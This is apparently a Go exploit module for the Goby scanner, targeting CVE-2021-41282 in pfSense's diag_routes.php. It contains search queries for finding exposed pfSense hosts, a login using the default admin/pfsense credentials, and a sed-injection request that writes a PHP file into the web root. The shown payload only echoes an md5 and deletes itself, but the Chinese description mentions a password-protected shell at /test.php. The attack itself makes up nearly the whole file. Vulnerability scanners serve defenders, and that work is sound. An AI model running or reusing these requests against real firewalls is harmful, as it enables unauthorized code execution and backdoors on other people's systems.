package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "pfSense diag_routes.php File Arbitrary File Write RCE (CVE-2021-41282)",
    "Description": "<p>diag_routes.php in pfSense 2.5.2 allows sed data injection. The data is retrieved by executing the netstat utility, and then its output is parsed via the sed utility.</p>",
    "Impact": "<p>pfSense Arbitrary File Write to RCE</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559</p>",
    "Product": "pfsense",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "pfSense diag_routes.php 文件命令执行漏洞（CVE-2021-41282）",
            "Product": "pfsense",
            "Description": "<p>pfSense是一套基于FreeBSD Linux的网络防火墙。pfSense存在安全漏洞，攻击者可利用该漏洞通过diag_routes.php来运行代码。EXP Shell path: /test.php，密码：1。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">厂商已发布了漏洞修复程序，请及时关注更新：</span><a href=\"https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559\">https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "pfSense diag_routes.php File Arbitrary File Write RCE (CVE-2021-41282)",
            "Product": "pfsense",
            "Description": "<p>diag_routes.php in pfSense 2.5.2 allows sed data injection. The data is retrieved by executing the netstat utility, and then its output is parsed via the sed utility.<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559\">https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559</a></span><br></p>",
            "Impact": "<p>pfSense Arbitrary File Write to RCE</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(banner=\"pfSense \" && protocol=\"snmp\") || body=\"https://www.pfsense.org/?gui=bootstrap\" || body=\"Rubicon Communications, LLC (Netgate)\" || body=\"<h4>Login to pfSense</h4>\" ||(body=\"<title id=\\\"pfsense-logo-svg\\\">pfSense Logo</title>\" && body=\"CsrfMagic.end\")",
    "GobyQuery": "(banner=\"pfSense \" && protocol=\"snmp\") || body=\"https://www.pfsense.org/?gui=bootstrap\" || body=\"Rubicon Communications, LLC (Netgate)\" || body=\"<h4>Login to pfSense</h4>\" ||(body=\"<title id=\\\"pfsense-logo-svg\\\">pfSense Logo</title>\" && body=\"CsrfMagic.end\")",
    "Author": "1276896655@qq.com",
    "Homepage": "www.pfsense.org",
    "DisclosureDate": "2022-04-09",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41282"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.8",
    "CVEIDs": [
        "CVE-2021-41282"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-1167"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "csrfToken|lastbody|regex|(sid:[a-z0-9,;:]+)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__csrf_magic={{{csrfToken}}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\\x3c\\x3fphp+var_dump(md5(\\x27CVE-2021-41282\\x27));unlink(__FILE__)\\x3b\\x3f\\x3e/;w+/usr/local/www/test.php%0a%23",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c3959e8a43f1b39b0d1255961685a238",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "csrfToken|lastbody|regex|(sid:[a-z0-9,;:]+)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__csrf_magic={{{csrfToken}}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\\x3c\\x3fphp+var_dump(md5(\\x27CVE-2021-41282\\x27));unlink(__FILE__)\\x3b\\x3f\\x3e/;w+/usr/local/www/test.php%0a%23",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c3959e8a43f1b39b0d1255961685a238",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10473"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
